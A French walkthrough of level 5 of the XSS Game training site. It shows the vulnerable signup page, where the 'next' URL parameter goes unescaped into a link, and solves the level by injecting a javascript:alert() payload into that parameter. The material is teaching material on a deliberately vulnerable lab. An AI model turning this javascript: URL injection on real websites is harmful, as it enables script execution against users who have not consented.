## NIVEAU 5 - [BREAKING PROTOCOL](https://xss-game.appspot.com/level5)

### DESCRIPTION DE LA MISSION

<pre>
Les scripts intersites ne se limitent pas à l'échappement correct des données. Parfois, les attaquants peuvent faire
de mauvaises choses même sans injecter de nouveaux éléments dans le DOM.
</pre>

<br>

### OBJECTIF DE LA MISSION

<pre>
Injecter un script pour faire apparaître un alert() dans le contexte de l'application.
</pre>

<br>

### INDICES

**Premier indice**
> [!TIP]
> <pre>
> 1. The title of this level is a hint.
> 1. Le titre de ce niveau est un indice.
> </pre>

**Deuxième indice**
> [!TIP]
> <pre>
> 2. It is useful look at the source of the signup frame and see how the URL parameter is used.
> 2. Il est utile de regarder la source de la page de connexion et de voir comment le paramètre URL est utilisé.
> </pre>

D'un point de vue général, il est **TOUJOURS** utile de regarder le code source pour comprendre la logique de fonctionnement d'un programme ou d'une application, pour peu, biensûr, qu'on y ait accès. Cela doit être un réflexe, voire, **INSTINCTIF**.

**Troisième indice**
> [!TIP]
> <pre>
> 3. If you want to make clicking a link execute Javascript (without using the onclick handler), how can you do it?
> 3. Si vous voulez que le fait de cliquer sur un lien exécute du Javascript (sans utiliser le gestionnaire onclick),
> comment > pouvez-vous le faire ?
> </pre>

**Quatrième indice**
> [!TIP]
> <pre>
> 4. If you're really stuck, take a look at this IETF draft.
> 4. Si vous êtes vraiment bloqué, jetez un coup d'œil à ce projet de l'IETF
> </pre>

Lien du projet **I**nternet **E**ngineering **T**ask **F**orce: [IETF - Internet-Draft](https://datatracker.ietf.org/doc/html/draft-hoehrmann-javascript-scheme-00)

<br>

### MISSION

On nous présente « Groovy Reader 2.0 » et il nous est demandé de nous inscrire à ce programme bêta exclusif.

La première page ne contient aucune fonctionnalité intéressante.
<br>Regardons les codes-sources des pages données sous la frame.

Ici, la page qui va nous intéresser est `signup.html` et plus précisément, la ligne 15:

```html
1   <!doctype html>
2   <html>
3     <head>
4       <!-- Internal game scripts/styles, mostly boring stuff -->
5       <script src="/static/game-frame.js"></script>
6       <link rel="stylesheet" href="/static/game-frame-styles.css" />
7     </head>
8 
9     <body id="level5">
10      <img src="/static/logos/level5.png" /><br><br>
11      <!-- We're ignoring the email, but the poor user will never know! -->
12      Enter email: <input id="reader-email" name="email" value="">
13 
14      <br><br>
15      <a href="{{ next }}">Next >></a>
16    </body>
17  </html>
```

Nous pouvons voir que l'utilisateur n'est envoyé vers aucune page affirmée une fois qu'il a cliqué sur `Next >>`.
<br>Comme nous l'avons vu précédemment, `next` est un paramètre variable, nous allons donc nous en servir de faille pour injecter notre script.

Voici le lien d'origine:

<pre>
https://xss-game.appspot.com/level5/frame/signup?next=confirm
</pre>

L'idée va être de placer le payload après `next=`. En l'état, le lien `Next >>` renvoie vers la page de confirmation `confirm.html`, mais elle peut renvoyer sur n'importe quoi.

Il s'agit donc de remplacer `confirm` par notre payload, par exemple: `javascript:alert("ACCES AUTORISE !")`.

```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("ACCES AUTORISE !")
```

Ensuite, appuyez sur la touche `Entrée` ou cliquez sur le bouton `Go` une seule fois, pour prendre en compte le lien, puis, cliquez sur le lien `Next>>`.

<br>

> [!IMPORTANT]
> <pre>
> Congratulations, you executed an alert:
>
> ACCES AUTORISE !
>
> You can now advance to the next level.
> </pre>

<br>

> [!NOTE]
> Bravo, vous venez de passer le cinquième niveau. Vous pouvez maintenant passer au dernier suivant. 
